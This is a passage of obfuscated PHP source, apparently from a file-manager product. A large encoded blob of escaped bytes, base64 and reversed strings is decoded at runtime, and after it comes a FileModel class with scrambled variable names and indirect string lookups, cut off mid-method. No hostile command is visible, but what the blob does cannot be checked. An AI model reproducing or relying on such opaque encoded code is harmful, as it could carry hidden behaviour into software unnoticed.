27\346\256\41".base64_decode('EQ7FmRNaHG+Nxtqk5EisciQ4Y8KBVN5HgcHVdf0byJGlGZ1cMuNYMOBXB6bXL+rfWA==')."\x5f\xd7\x1f\x5c\x14\x98\xc6\xe5\x59\x94\x5c\x49\x96\xb5\x13\x80\x6d\xb6\x89\x34\x7b\x1\x78\xff\x61\x40\x5a\xc\x62\xc1\x40\x0\x3e\xc2\x3\xc1\xfe\x20\xf3\xd3\x15\xe4\x89\x3c\xd3\xb8\x7b\xe7\x0"."\317\317\11\352\352\310\325\74\217\17\20\146\134\37\360\72\65\125\261\21\257\312\27\32\276\33\125\23\253\22\174\112\50\176\126\113\167\41\41\315\46\53\113\170\62\243\277\75\162"."\x56\xac\x9f\x53\x35\xa3\xb\x8b\x5d\x46\xcc\x32\x28\x60\x98\x62\x81\x88\x95\x9c\x31\xd3\x65\xec\x59\x49\x4c\x8b\x30\x79\x46\xa0\x80\xab\xa\x44\xc3\x87\xc4\xb1\x1b\x16\x62\x82\x2d\xd8\x22\xda\x1e"."\x61\xff\x6d\x43\x5c\xe4\xe2\xce\xc8\x92\xa5\xd1\xae\xee\x58\xcf\xb2\x78\x22\xd9\xbb\x7c\xc5\xca\x55\xe0\x5e\xb2\x99\xe1\x49\x56\xf1\x33\xc7\x68\xe0\x30\x35\x38\xac\x59\xc1\x61\xe6\xf2\x7b\x39\x3e"."\4\350\166\120\146\256\70\20\365\21\321\100\106\301\202\124\66\300\123\61\301\10\126\117\242\265\5\13\105\247\161\202\34\75\226\236\62\115\147\202\324\345\135\237\135\61\44\366\365"."\333\3\34\61\63\372\60\4\205\102\234\55\216\76\300\127\370\145\327\343\30\125\145\126\57\223\362\60\0\0\20\42\176\211\115\220\344\376\330\76\124\370\341\55\2\53\64\306\256".base64_decode('R4hXsjaTfwZ8gi7GPkGZP9B1xFOl183lOr825EoXfn3X+dER0RX3uLrECg3cuS+O2A==')."\74\46\57\11\262\125\160\75\37\274\41\165\172\126\43\7\162\47\304\11\242\1\331\254\314\4\117\335\35\210\65\226\14\76\231\257\144\301\72\141\166\213\70\247\246\121\237\42\174".strrev('{Lc­iGÛ¸LIf"æo.Ò15Ä0¦:âCaFS²Ó§àãÄ YëD=\'y3ü').base64_decode('C4xGW8fi0mshLocU8gMFWqnUNoj74Fq1LlBajmSxpoms9wKiPKr2GkDJ7ZSTy/D8tg==')."\10\361\131\314\112\363\353\252\16\212\5\361\255\66\15\346\65\333\131\356\362\320\363\271\156\221\261\47\212\56\316\255\162\106\51\150\332\166\20\173\25\44\354\41\327\353\212\45\330"."\45\205\273\57\124\325\105\72\115\202\143\63\356\335\227\373\376\25\16\202\251\154\231\206\303\334\333\12\342\162\103\71\354\140\303\54\262\327\46\302\243\45\323\326\145\177\323\31\235"."\x78\xb9\xe4\x16\xe5\x92\x1b\xe7\x82\x36\x8a\x57\xc\x53\x77\x93\x1c\x3a\x33\xf7\xc8\xb2\x8b\x41\x3c\x60\xfe\x82\xcb\x1\xfd\xa8\x1f\x75\xdd\xe3\x12\xd9\xd6\xf5\x21\xa6\x94\x27\x71\xbc\xfc\x54\xdb".base64_decode('w10de7uDUVYsXos7t6bXlf6qAL/kmYFireQqHbULqsbNhJPvIBkbdiSmPydV67XfEg==')."\276\247\321\134\322\7\16\226\352\143\314\257\263\207\266\170\134\101\367\57\356\357\352\117\312\303\344\130\132\66\213\232\55\71\35\165\265\105\170\236\6\364\43\157\22\260\301\230\330"."\x6f\x35\x48\xdf\x4f\xa8\xea\xf6\x1a\x12\x9\x8b\x1b\xb4\x88\xb6\x97\x6f\x84\xb3\x11\x41\xf2\xb8\x49\x15\xdc\x5d\x86\xe1\x80\xbd\x59\xa1\x22\x56\x2a\x4b\xef\xeb\xc8\xf8\x82\xb7\x7\xae\xc9\x85\x8f".base64_decode('xtRbOKP2xIs3vBLQwnqEhq7YajKrjQ01CBNrmmuOr0O/9TW+GswAkTieRQwg7ahpPg==')."\276\216\4\352\301\125\312\172\146\24\44\374\253\212\53\137\220\346\54\102\103\53\335\123\54\42\243\201\327\176\123\260\51\70\2\364\140\321\72\374\105\361\324\207\327\323\365\250\252".base64_decode('FdYz+bsqe3MGP9Ew6nJKJ28J8/Pc1Q7Vr/SHuk7yC4/HCxaNFvIKHGtaahsDDbUKew==').base64_decode('CqaltjfZ4Z9bu2jhAQvayK2lo3fha0d86KanzYVwq7AALy8eCbpjE5UF/Cto682iNg==')."\142\43\12\125\10\244\141\60\173\71\25\23\336\306\213\272\63\142\132\160\45\13\274\32\67\160\32\224\150\117\301\146\113\233\110\70\232\261\40\216\165\277\267\64\126\56\372\361\231".base64_decode('15+QveF53jdocOfHp1Z3fpk0pgX5KIggfauiWZEfMJFc/BKJCF2VTLsAYJhqMpCgoA==').base64_decode('WaGtjkmi6iaJJ3rai4faj5gDjP9oUTmG5J9bzuJ+JcP7doZ3FEgRPLl++VGOUcTJ4Q==')."\x64\xec\x9e\xdf\x8f\xe7\xd7\x6f\x64\x26\x4a\x11\x8b\xba\x6a\x53\xd3\x80\x2a\xd5\xb2\xf4\x96\x8d\x8c\xf7\x93\xe4\x16\xdc\x5f\x2e\xb3\xf\x56\xad\x54\xe6\x33\x59\x6\xd2\x89\x8\xaf\x4f\x76\xf3\x8e"."\117\340\176\56\364\367\172\221\27\274\271\126\351\362\36\55\136\245\151\106\363\254\171\350\177\12\71\201\135\342\227\113\114\141\30\5\231\113\374\143\203\131\106\7\304\263\31\254\157"."\170\302\245\67\4\134\140\61\214\174\205\63\2\342\312\47\132\353\172\220\5\72\112\317\205\322\133\7\104\124\113\127\22\126\155\121\371\213\20\125\50\51\142\362\1\105\31\227\55".strrev('–;V‚•4Ç‘j\\°t²¹lŠö'."\n".'j„>'."\r".'¬)\'¢Cò¤‰bkóÅ€±É	ğßé')."\x2\xa7\xda\xcd\x53\xed\xf9\xf8\x43\x2d\x58\x2b\xdc\x46\x11\x9a\x20\x1c\xc4\xe2\x7d\x44\xb8\xf3\xa3\xce\x68\x20\x85\xa\xa6\x3\xf8\x21\x97\x0\xde\xa4\xe2\xcc\x22\x51\xe8\x2a\x8f\x33\x46\xc3\xe1".base64_decode('L/Dky/wZjhIJQ+t7or2LI92Sdo4EUNvau9VQT0/VBPkbQXy1HVjLJP5phnELjEJOSQ==')."\x63\xb3\x83\x96\x1a\xc\xad\x51\x6c\x2b\xcd\x5c\xe8\xd6\x4\x81\xc6\x92\xc\xe2\xc\xb0\xc0\x80\x22\xb5\xb8\x88\x92\x45\x28\xe4\x27\x21\x9a\x5c\xbb\x70\x41\xd0\x58\xc8\x27\x42\xb8\x5\xb2\x4c\x61"."\x55\x11\x8\x1e\x87\x4f\x4\x41\xac\xff\x52\x3c\x1\xcf\xbc\x7c\x1d\x4f\xa0\x1d\xc2\x9\x90\xa2\x2c\xd0\x14\x3a\xc6\x2d\xb5\x44\x28\x5b\xab\xc\xa2\xbd\x9a\x2b\x5\x2e\xf4\x16\xee\x66\x77\x22\xb"."\x82\x9a\x9c\x88\x57\x5d\xdc\x64\xac\x31\x3f\x8\xc\x73\x7\x78\x55\xe5\xea\x21\xc9\xe1\x36\x79\x60\xa3\x4d\x2b\x2e\xaf\x2c\x82\x2b\xf\xa4\xe5\x24\x3a\x93\xc4\xee\xa3\x32\x7f\x90\x9c\x3e\x83\xe2".base64_decode('zOO+eOBy+ipIUdLSQxjHxIYAX4KEHnxIoQmu5wMcSeugjC2fiJzXEo/ZbNhAK8I8wA==').base64_decode('xo2VMFBo9CaFSoYXhPHFC8OHRQFDO5v7MxRX5UwCwvLQX1Em2r1YROghxZXYx3SHSQ==')."\xac\xbf\xaf\x36\x30\x6d\xe3\xc6\xa0\xc1\xd4\x7b\x98\x2a\x2\x2b\x1b\xe0\xb9\x69\xbc\x3f\xe0\xce\x8f\x7a\x2\x43\xcf\x33\x2\xc0\x9b\x93\x72\x94\x4b\x60\xc9\x1d\x10\x9c\x26\xac\xb5\xb8\x1a\x8f\x82".strrev('é‘iŸÌ4]Ø»r äEJmG/Œël'."\n".'äşƒõô›.q£BØÆ–Œ[ñöZZ{u')."\xd\x87\x4a\x25\x39\x1a\x64\x11\x2c\xe2\xce\x1b\xa9\x20\x5f\xe3\x54\xec\x1d\x48\xb\x23\x27\x96\x85\x50\x18\xf\x1c\xeb\xe0\x78\x12\xb0\x8d\x7\x1\xf\x23\xf2\x88\xf8\xb0\xb5\x5e\x38\xaa\x8b\x3"."\x79\x60\x81\x9d\xb6\x8c\x92\xe3\xa2\x4e\xf4\x65\xc6\x1a\xf2\x8c\xce\x5a\x6d\x58\xa3\x59\x6a\x14\x38\xa1\xb7\xd4\x10\xef\xf2\x35\x88\x1a\xd1\x14\x20\x3\xa2\x29\xb\x30\xd9\x51\x2c\x3d\xdf\x52\x43".strrev('ÈCqü{újÜp­pİCş´oU¨ğ4Fä+h˜å˜‰£'."\n".'5‚ µKO*:êkš')."\xd3\x6a\x79\xdd\xa2\x3a\xcd\x84\xc8\x90\xb\xad\xac\x10\xc3\xc0\xe3\x5a\x3d\xf1\x58\x32\xd6\xc6\xde\x22\xaa\x26\xaf\x99\xc9\x58\x59\x9b\x1a\x86\x89\x23\xf\xb3\x4c\xe1\x57\xfc\x2c\x7\x67\xe\x82"."\x0\x81\x79\xb7\xca\xc5\x22\xd7\x96\xc2\xdc\x22\xdf\xc1\xb0\xf6\x85\xba\x24\x11\xeb\x66\x4f\x7a\x24\x39\xda\x60\x33\x9a\x80\xd2\xa7\xb1\xb\x10\x50\xb3\x24\x46\x30\x6d\xd1\x48\xb8\x3b\xa9\x46\x60".base64_decode('o2psmhNoEJYp9NInMVh2xIaKXdknseGsDWDJuR92LYi+1UfNd1samI0C09MSRlSQsw==')."\112\35\124\32\231\344\172\120\172\321\45\60\241\337\316\233\314\337\141\123\103\103\203\277\241\21\375\317\64\171\231\227\265\346\206\206\212\54\15\15\315\344\177\232\100\204\204\60\157"."\356\24\104\37\30\141\203\14\43\272\16\15\202\275\242\140\24\313\214\7\353\153\303\106\115\12\156\32\164\131\350\161\241\51\43\156\10\31\215\231\57\235\34\347\53\344\62\14\142"."\272\167\20\370\55\43\40\201\354\243\232\205\21\53\204\20\202\14\12\264\227\133\336\241\154\2\325\346\123\103\307\26\336\250\160\61\323\47\177\54\300\6\227\2\205\137\145\77\113"."\360\313\357\40\100\41\272\173\10\151\272\253\151\250\214\333\277\41\206\240\275\73\315\373\211\1\222\200\5\363\165\222\317\106\34\225\205\346\44\231\233\257\221\130\236\133\325\343\150"."\67\257\211\76\267\101\215\310\140\14\253\240\353\240\71\242\212\215\32\107\227\360\30\31\122\174\302\142\150\230\221\114\14\361\270\62\222\55\145\347\102\51\161\25\16\67\373\304\324"."\174\310\310\273\14\154\125\251\250\74\266\363\161\106\326\223\244\273\44\256\10\55\372\20\177\164\204\152\332\261\266\51\260\364\150\224\170\131\46\17\3\122\345\310\346\3\52\46\327"."\361\116\54\231\43\313\24\326\262\25\372\55\54\46\315\24\23\4\47\76\107\5\205\101\302\14\100\265\67\332\270\163\103\251\2\157\222\247\114\210\312\217\53\12\0\274\62\67\221".strrev('{<ÁÕ=à†ƒËn³C™–J|:Xc«6UÅæŞ'."\r".'…6’Û7¤:û*Ö÷a­ÄÜáÉW¹')."\145\316\52\231\170\353\345\174\62\20\13\364\331\363\234\200\316\302\142\127\23\257\3\113\131\305\131\110\2\272\127\263\224\320\306\337\6\222\201\370\60\47\53\57\20\225\123\167\35".base64_decode('+JTohvCWfQbSsdO9A0+5ygp3NJugSFjyIsuHVReaMFxluhJ4hMQVpRtOYfT87bolSQ==').strrev('¢ÊªCÇW,¡ñr°ğ¹al>ÿNßÚw1r--ºX,Ux”è€®J²ËÙ×—B')."\274\242\73\371\203\246\125\20\321\215\154\25\130\105\130\10\134\1\264\6\255\146\51\206\153\7\102\346\103\347\100\233\112\361\174\30\254\320\127\76\225\242\316\355\244\335\223\52\27"."\200\27\172\114\304\162\141\117\251\162\41\134\127\257\207\104\55\165\121\104\336\326\76\322\130\246\257\245\114\15\64\201\56\331\124\346\162\237\322\143\161\377\30\204\156\367\241\156\15"."\x20\xbe\x7f\x9c\xef\x26\x30\x21\x7d\x94\x1a\xb3\x3a\x71\x93\x21\x94\x61\xf3\xb3\xae\xac\x33\x66\x5e\x71\x6f\xb4\xd2\xb6\xa1\x48\x75\x2\x15\x4f\xe\x5a\xa6\xc3\xcf\x7d\x38\x1d\xa1\xa5\x88\x44\x65"."\x6\x2f\x49\x8b\xf8\x17\x8a\xcf\xba\x6e\xcb\x24\xef\xd3\x3c\x2b\xda\xe6\xd9\xd7\x35\xd6\x22\xa2\x3\x45\xbc\x77\x4b\x47\x51\x4f\xd4\xab\x31\x46\xb6\x69\x87\xed\xb4\xcc\x9d\xb7\x50\xa6\xc2\xb3\x9a".base64_decode('kFRsqnwBCvEiwD9Yetq0iCRC8q5QdOJ6To5GTS6BwbdeepUqsEMbadXjRRBKO2XZPQ==').strrev('(‘B&Ìxpñª¿å>ˆ€ÉB2=%ãWò@”ºdišÒ©8Toèî÷$Åõä').base64_decode('ZuSAKyCeSnAPbDkNVYu974qeyUXINyuK0DTMwwh/H3KKjf2297Jpq5ZS5VMkSRrRNA==').base64_decode('94AEoyMGCRLGdKZV6G9s8jP/UbLBBDtE0Bg+7EhogI9kjIqATh7kE3lM6cKL+AARng==')."\xf\x88\xbb\x13\x3e\x9f\xc4\x2f\xa\x8f\x59\xd2\x56\xae\x73\x7d\x3d\xe2\x20\x44\xa6\xaa\xe2\xfe\x9c\xaa\xf1\xe1\xc\xbd\xd5\xd2\xe9\x8\xe1\xe4\x76\x97\xe2\xa5\x27\x3\x5a\x19\xee\x74\x70\xe0\x2e".base64_decode('GkN9lJgurRhPJfBMgOyinpQS/RDapwhkUjfx0sAIPQDqOoWp0XK6JMBJkwMrdQkwVg==').base64_decode('QpXUxBRezqyrxyamLslX1xg3+MOaOXiP5OqWthxhqRw5bVeEaiK5SnMQzzWiM6tQJg==').strrev('{ƒÌò¥£ºrU,IÚ([HâØÑ+HÁHÕó‡T}u1µ6</pô_+Pr	ìéé¡')."\x29\x13\x31\x24\x1d\x78\x86\xd5\x29\xfe\xe2\x0\xe\xfa\x53\x88\x61\xf7\x67\xf8\xa1\xc6\x16\xc7\x17\x49\x1f\x4b\x7a\xac\xc9\x5d\x2d\xc5\x3f\xdd\xaa\xa8\xb1\x88\x8d\x3d\xf2\x15\x65\xb0\x70\xb5\x4a".strrev('\\˜Ä¬øX†Øl8£xÔN/D>#s…@¿Õü­*å¥‹R7ŠÇL™^–K™J:¼î').base64_decode('e6i9K9KthqLR2AqX3poQK1v8EY6M/GaHNDNiEujXKx2JgRsm2T26R4pBp0/2KVdiFw==')."\50\360\354\40\167\341\117\243\322\223\72\45\113\63\154\135\2\320\247\140\246\201\155\205\226\317\273\36\323\313\147\245\150\331\275\263\126\375\224\112\77\300\140\222\377\272\152\31\342".base64_decode('kcWdyf91U42M8B1lZJgeBzeFo9792+SHF9k3K54N+twHiHyS7xniXYe9g2aS0wiwyg==')."\24\26\211\251\324\315\214\370\4\72\47\133\143\45\371\316\57\230\141\157\260\60\136\23\273\310\13\263\213\46\34\21\347\2\234\35\152\303\237\243\247\105\164\10\306\62\57\166\202".base64_decode('YHqIiE7AOLvuvD1PKXlVNl2P1Fd8g/jxp2l9uDso54DoHIrxdzpEUW9KlQagZEWIlA==')."\x78\x6\xa5\x45\x69\xa0\xaf\x7a\xf1\x37\x18\x94\x5\xcc\xb0\x57\x7c\x80\x38\xb5\xa\x17\x4a\x8e\xeb\x24\xdd\x29\x2b\x6d\x4b\x73\x43\x1\x84\xd3\x11\x27\x25\xac\x8d\x64\x16\xc6\x2a\x0\x2e\x39\x52".base64_decode('lLWLq9nhFyiKWVMeP0KQsQY+fZuPHtl9iF3XncqHfGjx/y8FaWJC8lzorqSyQbZ3qw==')."\23\154\27\176\243\150\320\34\161\77\320\207\41\336\127\211\134\357\21\111\213\206\330\237\312\57\50\271\13\371\52\136\2\121\310\313\253\12\102\165\230\105\354\314\210\35\11\111\146".strrev('©Ëº®y,Âö4L5…):s‹¥Ğ5êâÆ|Ú©õ“à¨JÛÌí²ü?OéSÓé')."\366\124\25\166\120\347\176\103\105\74\115\43\366\116\367\123\35\374\222\330\26\213\301\166\134\217\303\44\315\244\226\363\121\216\14\123\65\21\153\35\223\303\262\352\47\351\5\112\144".base64_decode('srQMn++FUgb23lvGR14mo6TO+7qJtNI4/ZRL5/JmSsvHqVaay17DQqcpne0BrmwUFA==').strrev('ÅzOÏ²yÎ’Ô'."\0".'KĞŒ\\«âá‹²é9À„í›Ò­íbU;&õ¤—_è™o%eq%JÔ').base64_decode('JyyzIDtqZw+904MBk6tk96xcIt0hvUQerLyXxfp2QFHkN+3hYjwgH8Qgg7JAEajhWg==')."\xc8\x18\x95\x10\x37\x4c\xdf\x7e\x23\x94\x42\x66\xdc\x3f\x3\x2a\xbd\xbc\x3\x6f\xcc\x55\x7b\x48\x87\x62\x3e\xf9\x69\xd7\xb3\xfc\x50\x83\xe3\x62\x73\x97\x3d\x56\x8\x85\xd\xef\xf3\x6f\x95\x4f\xd9"."\261\147\353\330\322\201\67\353\252\74\104\67\341\73\166\76\141\204\367\131\357\363\10\123\61\367\303\305\270\37\234\65\340\347\206\212\243\207\367\324\301\207\325\123\40\356\35\344\244".base64_decode('WSmeFTfXrlf2pF4Daat8qU8aBqnfZSvvI5f4PuYJrupjf67XgrwTWuW5wM+tEJSByQ==').base64_decode('oSvjpnrNC1IWuxX1ZjNcuKtaurAkob49KzaIVYVM04xZ82ThhphCcT8IdvJw5Qncig==')."\100\12\305\65\14\76\205\71\24\225\127\77\111\164\353\147\127\76\46\351\331\1\376\167\13\106\234\36\150\126\111\153\272\362\121\336\212\21\40\170\52\351\23\111\33\242\107\101\304"."\xc4\x1a\x1c\xb6\x58\x75\x74\xb\x14\xef\x49\xba\xbf\x45\xd9\x87\x2a\xfd\x10\x9f\x95\x16\xb\x7d\xf\xd0\xcc\xe3\x33\x76\x1\x8b\xce\x1d\x4b\x73\x1f\x28\xab\x9d\x9b\xc8\x48\xb0\x43\x9a\x41\x1e\xda"."\xd6\xbd\x6d\x27\x3\x3\xd2\x14\x91\x2c\x1d\xac\xe4\x1a\x1d\xd3\x2b\xa\xc2\xc5\xf1\xbe\x48\x24\x91\xb1\x62\x1e\xb6\x6d\x6c\x76\x2c\x56\x9b\x44\x89\xfe\x17\x13\xc8\xce\x48\xf4\x38\x25\xd4\x83\xaa"."\xf4\x3c\x78\x22\x23\x2d\x55\xde\x7b\x94\xb4\x2d\x3e\xa3\xdd\x94\xbb\xe3\xe7\x41\xbf\xe6\xf8\x25\x84\x94\xc4\x87\xba\x13\x23\x13\xc\x24\x42\x1c\x5b\xdd\x7d\xf5\x54\x8f\x8a\x89\x3a\x6\x7c\xca\x44".base64_decode('mSpZPOlZSOGYSmLucGlmizjBqZ+YwrnZJPnROmJRJvwwkOXqWrqSz17ZKItUJK+Jyg==')."\xaa\xa5\x27\x0\x85\x54\x88\x88\x91\xa0\x47\xb0\xa0\x89\x3e\x2\x69\x66\x68\x31\xb7\xe2\xd3\x24\xfd\x2e\xb7\xa8\xa\xf\xb5\xf4\xbc\xab\x29\x87\xc5\x14\x60\xb2\x1f\x63\x9e\x50\xd1\xd7\x5d\x47\x4d"."\x14\x6f\xf7\xbc\xf6\x4b\x48\x94\xf7\x9\x60\x36\x44\x84\x2e\x8\x92\x27\x19\x83\xba\xce\x35\xfc\x51\x34\xd7\x39\xc7\xf6\xbe\x84\x88\xb8\x3d\xd9\x9b\x31\x8a\x7a\x5f\x92\x5\xda\x48\x94\xec\xe9\xd7"."\xa4\xdd\x95\x35\x2a\x27\x85\xba\xcb\x5\x11\x91\xe4\xbb\xe4\x48\xc5\x13\x5d\x36\xb3\xd8\xdb\x92\x87\xc\x30\x4b\x5c\xdb\xf3\x42\x2a\xf5\x33\x4b\xc3\x8c\xf3\xff\xff\xfd\x8\xe0\xff\xad\xb7\xff\x66"."\65\60\111\274\353\1\341\305\300\177\103\153\361\155\43\227\107\120\51\260\247\37\356\35\164\62\140\21\177\36\133\212\163\115\142\346\161\213\71\342\322\330\145\224\226\317\113\373\154".strrev('İE|ñï+Æ ¦<Qƒñ‚Œµ@ëòs	ì}­3ï2Ë^"Õkø†ù¬ÓÅKõ')."\236\240\45\216\243\42\233\370\52\142\114\230\363\262\40\13\245\361\31\220\170\24\200\361\222\115\100\143\45\166\132\254\7\62\77\0\277\140\151\16\124\111\246\104\56\120\5\375\112".strrev('¾ğoÅ„[¶Ê°EËå|ÒÊ‚UJú!ò±³æ&i&g]‡¼ºĞ['."\r".'f”Áfº').base64_decode('3uiv/Bi1mMBSlDiWWzBJFLnSIVerVcpQTE2IPBOsleorlj/vKcRyOCT3l638Hssk3A==').strrev('ãK/KÜÅ0è–tXÀãÕvöŠÏq&ÜMÁĞH®z°‰bÜ€ÔõŞô¬n’9eÊ')."\65\45\34\45\142\267\126\104\174\70\56\155\341\314\36\117\122\147\7\220\113\310\147\313\57\157\270\113\142\3\5\367\132\132\130\55\133\332\264\154\51\33\207\127\313\213\61\114\26".base64_decode('Yshp+O1fxzUXwrO/16M/OdrT07rr0A7XujJIuvVEnHfG/UQISSRg5lMTapDu7dzXpg==')."\xdc\x8f\x79\x5\xa5\x2c\x1b\x51\x29\x99\x94\x62\xae\xda\xd0\x2f\xb6\x59\x8c\x8\x4f\xc\x24\x99\xde\x48\x84\xa4\x7\xa6\xbd\xa5\xdc\x6f\x91\x4b\x97\xac\x69\x82\x79\xe1\xca\x7b\x34\x71\xbd\x27\xf1".base64_decode('GawYPhaJLcADr/a0dlYbFkySYMwzGf6qvSsrfw+KQxGEZyVMlmSuKzTo9RHvC8MB2Q==')."\304\327\225\261\22\52\314\171\245\362\342\106\105\164\23\303\252\165\237\54\64\167\161\331\134\230\43\225\0\321\107\36\270\106\226\164\10\302\126\42\102\125\213\166\205\237\365\305\47".base64_decode('3cbJPBufM5SH2OT4XVDPsQ6LVRjH4Emy5deB3XensvBBQgE9H5Wqk+9VJyyQqP4RgQ==')."\225\356\41\226\254\272\105\2\333\352\344\132\134\44\222\167\14\162\306\345\104\127\163\274\123\113\116\44\2\175\51\260\100\144\272\64\55\344\116\242\371\165\117\353\345\2\336\236\321"."\x12\xf6\x88\xe1\xa4\x7\xa5\x63\x52\x65\x62\x25\xdc\xaa\x18\x54\xf8\x50\xf5\xf6\x7a\x5b\xc5\xc6\xd4\x7b\x78\x14\x95\x54\xb4\x47\x52\xce\x48\x9a\x55\xca\xd0\x16\x55\x2d\x46\x93\x70\x49\xc1\xae\xba".base64_decode('yk4wBLgsTcJlK5JZYUnWIpVztLI9QfcqBw8EEJkqHfYc02nWicazaubKzwHGeXMTiQ==')."\105\365\126\10\101\203\347\222\274\132\53\252\146\236\260\25\42\267\147\27\250\106\153\131\312\204\306\104\23\52\216\10\145\212\112\62\57\322\252\250\166\320\117\342\55\134\366\344\124"."\x25\x59\xd6\x13\xa9\xae\x49\x12\xaf\x4a\x19\x6c\xb7\x8a\x87\x7\x2e\x8f\x1b\x38\x2\xa5\x11\xa6\xfb\x85\xe\x92\x79\x63\x48\x68\xbd\x31\x5\xf6\xa9\x2e\xf2\x5f\x2e\xe\x15\x4d\xbe\xa5\x64\x84\x82"."\x22\x56\xae\xe\x59\xde\x71\xae\xa8\xcd\x8d\xc6\xc5\xb2\xe4\x5b\xb5\xaa\x3e\xbd\xf\x1f\xfb\x2b\xf\xd8\x79\x8d\xdd\x12\x48\x86\x8\xf4\x44\x64\x3a\x46\x5a\x77\x3b\x70\x95\x1d\x3a\xd1\x74\xf6\x91"."\xbc\x24\x47\xf4\x88\xf0\x84\x10\xc2\xa5\x82\x50\x45\xc8\x45\x40\x34\x18\x10\xd2\x74\x5a\x9f\xe8\x8b\x84\x13\x2e\x1b\x11\xca\x46\xc0\x25\x4\xbd\xbf\x6c\xc3\xf7\xe4\xfc\xe6\x8a\x38\x1f\xa5\xdb\x2e"."\115\116\230\226\343\303\151\111\263\104\176\133\115\307\21\367\371\364\324\117\170\105\274\167\372\44\165\25\24\22\327\124\270\121\344\376\203\240\55\241\76\44\10\67\251\370\70\235\320"."\x69\x2a\xa1\x59\xae\x8\xbe\x57\xe1\x11\x79\x6b\x84\x1b\xd5\x8e\xb2\xe7\xce\x57\x0\xd0\xd9\x35\x65\x8e\x32\xd7\x8e\xd8\xc\x5d\xb4\x47\xdc\xbc\x90\x21\x13\xec\xb\xa0\x9f\xac\x70\x43\xc\xfc\xed"."\x20\x4d\x9\xc2\x53\x1\x7e\xd\xf3\x91\xf0\x2e\x59\x60\x6d\x29\xe7\x2a\x4e\x5f\x77\xe2\x7a\xa9\x9f\x55\x3\x48\x5c\x45\x15\xd4\x1f\x38\x11\x85\x81\x31\x4f\x22\x99\xa8\x48\xea\x9\x25\x12\x2b\x62"."\361\166\352\76\274\42\231\224\222\24\230\52\222\172\72\143\335\23\245\205\273\102\221\150\105\32\326\165\352\126\205\17\56\232\24\351\41\255\44\27\206\23\265\42\322\266\124\264\204".strrev(')!¥GFıÀy^fŞŞ$Óû!!é)”M|áê¦Y/ìòĞ‘ÑvyòdĞi~AM\\')."\124\204\365\224\272\241\356\170\11\240\330\235\72\137\353\234\317\26\167\355\1\327\235\274\4\47\353\201\20\30\11\347\344\175\230\0\246\125\35\40\131\10\134\171\51\101\122\305\0".base64_decode('4IYtMUHJba2Zki4d6CkH7ERhSCVdNBp2JTtarurVNBX24RUvxHD/B2F7TjSIrAAA').base64_decode('').base64_decode('')."".""."".""."", 10, -8))); goto Aå„‡Ø¬¡–; F‹ÏÇ†äµ÷: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\145"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\x6d\145" => "\151\157\137\146\151\154\145\137\x6d\145\164\x61", "\155\x65\164\141\x46\x69\x65\154\144" => "\x66\x69\x6c\x65\x49\x44"); public function fileInfo($ñåÙÔ) { $¡ÏèÓì =& $_SERVER[¹ş¤¶ĞÖ]; static $‰ï§ÏŠÌ = array(); if (!isset($‰ï§ÏŠÌ[$ñåÙÔ])) { $’ì±ÉÏ¨ = $¡ÏèÓì[1915]; $«½ô÷¤ = Model($¡ÏèÓì[500])->field($’ì±ÉÏ¨)->where(array($¡ÏèÓì[498] => $ñåÙÔ))->find(); $‰ï§ÏŠÌ[$ñåÙÔ] = $«½ô÷¤; } return $‰ï§ÏŠÌ[$ñåÙÔ]; } public function addFileByContent($¤ÑÈûãÙ = '', $ÁïÛÈ·  = '') { $§Š®Óæ =& $_SERVER[¹ş¤¶ĞÖ]; $şàà»¼ˆ = TEMP_PATH . $§Š®Óæ[1916]; if (!is_dir($şàà»¼ˆ)) { mk_dir($şàà»¼ˆ); } $è“íÅè‡ = $şàà»¼ˆ . $§Š®Óæ[1917] . rand_string(16); file_put_contents($è“íÅè‡, $¤ÑÈûãÙ); $œ¥Íä—ñ = $this->addFile($è“íÅè‡, $ÁïÛÈ· , !0); if (file_exists($è“íÅè‡)) { @unlink($è“íÅè‡); } return $œ¥Íä—ñ; } public function createFileName($ş¥ôå…, $×àÅÑÔ = false, $ïçÉøƒ = false) { $½ôõ‘áÌ =& $_SERVER[¹ş¤¶ĞÖ]; $‰¯™•—¹ = IO::init($½ôõ‘áÌ[8]); $€Ï¢ÜˆÈ = $this->makeFilePath($ş¥ôå…, $‰¯™•—¹, $×àÅÑÔ, $ïçÉøƒ); $Æ¡™Ç„À = $‰¯™•—¹->pathFather($€Ï¢ÜˆÈ); static $¶É¾Ğ£¹ = false; $ »½‘ñ´ = $½ôõ‘áÌ[1918] . md5($Æ¡™Ç„À); if (!$¶É¾Ğ£¹ && !Cache::get($ »½‘ñ´)) { $¶É¾Ğ£¹ = !0; $¬è–Õñ = IO::mkdir($Æ¡™Ç„À); if (!IO::exist($¬è–Õñ . $½ôõ‘áÌ[823])) { IO::mkfile($¬è–Õñ . $½ôõ‘áÌ[823]); } Cache::set($ »½‘ñ´, 1, 3600 * 2); } return $€Ï¢ÜˆÈ; } public function makeFilePath($æÀ¶á”, $Ù­õ¥¢•, $Ù‚³â  = false, $¹ÃñßîÉ = false) { $éÕÕù› =& $_SERVER[¹ş¤¶ĞÖ]; $äïïÉ… = Model($éÕÕù›[796])->get($éÕÕù›[1919]); $úËµ£î = KodIO::defaultIO() . date($éÕÕù›[1920]); $è¯ÀÒ†ª = $úËµ£î . rand_string(5) . short_id(100); $æÀ¶á” = str_replace($éÕÕù›[8], $éÕÕù›[11], KodIO::clear($æÀ¶á”)); $°¶Ö’ñÓ = $Ù­õ¥¢•->ext($æÀ¶á”); if (!$æÀ¶á”) { $äïïÉ… = $éÕÕù›[1921]; } switch ($äïïÉ…) { case $éÕÕù›[1922]: $è¯ÀÒ†ª = $è¯ÀÒ†ª . $éÕÕù›[10] . $Ù­õ¥¢•->ext($æÀ¶á”); if ($°¶Ö’ñÓ == $éÕÕù›[1859]) { $è¯ÀÒ†ª .= $éÕÕù›[1239]; } break; case $éÕÕù›[1923]: $ÖÕÜ’™Š = Model($éÕÕù›[796])->get($éÕÕù›[797]); $‰”ô´Úğ = substr(md5($éÕÕù›[798] . $ÖÕÜ’™Š . date($éÕÕù›[774])), 0, 8); $«÷õÁ¬ = KodIO::defaultDriver(); $úËµ£î = $éÕÕù›[1270] . $«÷õÁ¬[$éÕÕù›[428]] . $éÕÕù›[438] . date($éÕÕù›[1924]) . $‰”ô´Úğ . $éÕÕù›[8]; if ($°¶Ö’ñÓ == $éÕÕù›[1859]) { $æÀ¶á” .= $éÕÕù›[1239]; } $ô±¬˜Û = $éÕÕù›[1925] . $úËµ£î . $æÀ¶á”; 